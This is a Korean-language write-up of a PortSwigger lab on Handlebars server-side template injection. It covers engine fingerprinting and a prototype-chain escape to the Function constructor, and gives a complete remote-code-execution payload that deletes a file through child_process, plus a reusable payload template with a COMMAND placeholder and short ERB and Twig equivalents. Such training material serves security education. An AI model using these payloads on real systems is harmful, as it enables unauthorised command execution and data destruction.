# Lab: Server-side template injection in an unknown language with a documented exploit

## 개요

- **난이도**: Practitioner
- **주제**: Server-Side Template Injection — 엔진 미상 식별 / Handlebars / Node.js child_process / 프로토타입 체인 탈출
- **링크**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

## 목표

엔진이 명시되지 않은 환경에서 탐지 → Handlebars 확인 → 프로토타입 체인을 통해 `Function` 생성자에 도달해 `child_process` 로 OS 명령을 실행한다.

## 1단계 — 엔진 식별

### 다양한 구문 삽입 시도

```
${7*7}      → 에러 없음 / 그대로 출력 → Freemarker 아님
{{7*7}}     → 49 출력 → Handlebars / Jinja2 / Twig 계열
```

### Handlebars 특유 동작 확인

```
{{#if true}}yes{{/if}}   → "yes" 출력 → Handlebars 확인
```

Handlebars 는 `#if`, `#each`, `#with` 같은 블록 헬퍼(block helper)를 사용하는 특징이 있음.

## Handlebars 기본 개념

### Handlebars 란

```
JavaScript(Node.js) 기반 템플릿 엔진
설계 철학: "Logic-less Template"
  → 템플릿 안에서 복잡한 로직 실행을 막는 것이 목표
  → 변수 출력과 단순 조건/반복만 허용
  → eval, exec 등 직접적인 코드 실행 불가

주로 사용: Express.js 웹 프레임워크와 함께
```

### Handlebars 기본 구문

```handlebars
{{variable}}              출력
{{#if condition}}...{{/if}}    조건
{{#each list}}...{{/each}}     반복
{{#with object}}...{{/with}}   컨텍스트 변경
{{! 주석 }}               주석
```

### Handlebars 가 코드 실행을 막는 방법

```
Handlebars 샌드박스:
  - JavaScript 표현식 직접 실행 불가
  - require(), eval(), process 접근 차단
  - 등록된 헬퍼 함수만 호출 가능

→ 다른 엔진(Jinja2, ERB)에 비해 제한이 강함
→ 하지만 프로토타입 체인으로 우회 가능 (오래된 버전)
```

## Node.js child_process 모듈

RCE 에 사용하는 핵심 모듈:

```javascript
// child_process 는 Node.js 내장 모듈
// OS 명령을 실행하는 기능 제공

const { execSync } = require('child_process');

// execSync: 명령 실행 후 결과 반환 (동기)
const result = execSync('whoami').toString();
// → "peter-gBxxxx"

// exec: 비동기 실행
const { exec } = require('child_process');
exec('whoami', (err, stdout) => console.log(stdout));

// spawn: 스트리밍 방식
```

```
[왜 child_process 인가]
  Node.js 에서 OS 명령 실행 = child_process.execSync()
  Python 에서는 os.popen(), subprocess.run()
  Ruby 에서는 system(), 백틱

  Handlebars 는 Node.js 환경 → child_process 가 RCE 의 목표
```

## 2단계 — 핵심 개념: Function 생성자 = eval 대체

Handlebars 가 eval 을 막지만, `Function` 생성자로 우회 가능:

```javascript
// 일반 eval (Handlebars 에서 차단)
eval("require('child_process').execSync('whoami')")

// Function 생성자 (동일한 효과)
const fn = new Function("return require('child_process').execSync('whoami').toString()");
fn();   // → "peter-gBxxxx"

// Function 생성자는 문자열을 받아 함수를 만들고 실행
// → 사실상 eval 과 동일
// → require 등 Node.js 전역 접근 가능
```

```
[핵심]
  Handlebars → eval 차단
  → 하지만 Function 생성자에 접근할 수 있다면?
  → new Function("code") → eval 과 동일한 효과
  → Function 생성자에 도달하는 것이 목표
```

## 3단계 — 프로토타입 체인으로 Function 생성자 접근

```javascript
// JavaScript 의 모든 함수는 Function 의 인스턴스
// 모든 함수에는 .constructor 프로퍼티가 있음

"hello".sub          // String.prototype.sub — 문자열 메서드 (함수)
"hello".sub.constructor  // → Function (함수의 생성자)

// Function 자체도 함수이므로
Function.constructor === Function  // true

// 즉
"hello".sub.constructor === Function  // true
```

```
[Handlebars 에서의 경로]
  string       → 문자열 "s"
  string.sub   → String.prototype.sub (함수 객체)
  (lookup string.sub "constructor")
               → Function 생성자

  Function.apply(null, ["return require('child_process')..."])
               → 코드 문자열로 함수 생성 후 실행
               → RCE 달성
```

## 4단계 — 전체 익스플로잇 페이로드

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### 페이로드 단계별 분해

```
[1] {{#with "s" as |string|}}
    → 문자열 "s" 를 string 으로 참조 (나중에 string.sub 에 접근하기 위함)

[2] {{#with "e"}}
    → 컨텍스트를 "e" 로 변경
    → 이 블록 안에서 split 은 "e".split (함수)

[3] {{#with split as |conslist|}}
    → split 함수를 conslist 로 참조
    → conslist 는 배열처럼 push/pop 가능한 함수 객체

[4] {{this.pop}}
    → conslist 에서 기존 요소 제거 (초기화)

[5] {{this.push (lookup string.sub "constructor")}}
    → string.sub = String.prototype.sub (함수)
    → lookup ... "constructor" = 그 함수의 .constructor = Function
    → conslist 에 Function 생성자를 push

[6] {{this.pop}}
    → Function 생성자를 꺼냄 (conslist 는 비워짐)
    → 하지만 다음 단계에서 참조됨

[7] {{#with string.split as |codelist|}}
    → string.split 함수를 codelist 로 참조

[8] {{this.pop}}  +  {{this.push "return require(...)"}}  +  {{this.pop}}
    → codelist 를 초기화하고 실행할 코드 문자열을 담음

[9] {{#each conslist}}
      {{#with (string.sub.apply 0 codelist)}}
    → string.sub.apply(0, ["return require(...);"]) 호출
    → = Function.apply(null, ["code"]) 와 동일
    → 코드 문자열로 함수 생성 + 즉시 실행
    → require('child_process').execSync('rm ...') 실행
```

### 핵심 요약 (단순화)

```
복잡한 배열 조작의 목적:
  "어떤 함수".constructor    → Function 생성자 획득
  Function.apply(null, ["return require('child_process').execSync('cmd');"])
                            → 코드 문자열 실행 (eval 효과)
                            → child_process 로 OS 명령 실행

복잡해 보이지만 본질:
  Function 생성자 접근 → 임의 코드 실행
```

## Handlebars SSTI 가 복잡한 이유

```
[Jinja2, ERB 등]
  템플릿 안에서 코드 직접 실행 가능
  {{ ''.__class__.__mro__ }} 같은 단순한 체인

[Handlebars]
  Logic-less 설계 → 직접 코드 실행 차단
  → 배열 메서드(push/pop), 프로토타입 체인 조합
  → 여러 블록 헬퍼를 중첩해 간접적으로 Function 에 도달
  → 페이로드가 길고 복잡

[실전에서는]
  완전히 이해하지 않아도 문서화된 페이로드 존재
  → "Handlebars SSTI payload" 검색 → 적용
  → 명령 부분만 수정해서 사용
```

## 자주 쓰이는 페이로드 패턴 (명령 부분만 수정)

```handlebars
{{! COMMAND 부분만 바꿔서 사용 }}
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('COMMAND').toString();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

## 핵심 정리

- Handlebars 는 Logic-less 설계로 직접적인 코드 실행을 차단하지만, 오래된 버전에서는 프로토타입 체인을 통해 `Function` 생성자에 도달할 수 있다.
- `Function` 생성자는 `eval` 과 동일하게 문자열을 코드로 실행하므로, 여기에 `require('child_process').execSync()` 를 담으면 OS 명령 실행이 가능하다.
- 페이로드가 복잡하더라도 문서화된 것을 찾아 명령 부분만 수정하면 적용할 수 있다.

## 배운 점

### SSTI 엔진별 복잡도 비교

```
[간단한 편]
  ERB:      <%= system('cmd') %>
  Jinja2:   {{ ''.__class__... }}  (체인 길지만 직관적)
  Twig:     {{['cmd']|filter('system')}}

[복잡한 편]
  Handlebars: 여러 블록 헬퍼 중첩 + 배열 조작 + 프로토타입 체인
  Velocity:   Java 리플렉션으로 Runtime 접근

→ 복잡한 엔진일수록 "문서화된 페이로드 검색 → 적용" 전략이 현실적
```

### child_process 가 Node.js RCE 의 핵심인 이유

```
Python   → os.popen(), subprocess.run()
Ruby     → system(), `cmd`, IO.popen()
Java     → Runtime.getRuntime().exec()
Node.js  → require('child_process').execSync()

각 언어/런타임마다 OS 명령 실행 모듈이 다름
→ 엔진(언어)을 파악하면 어떤 모듈을 목표로 할지 결정됨
```
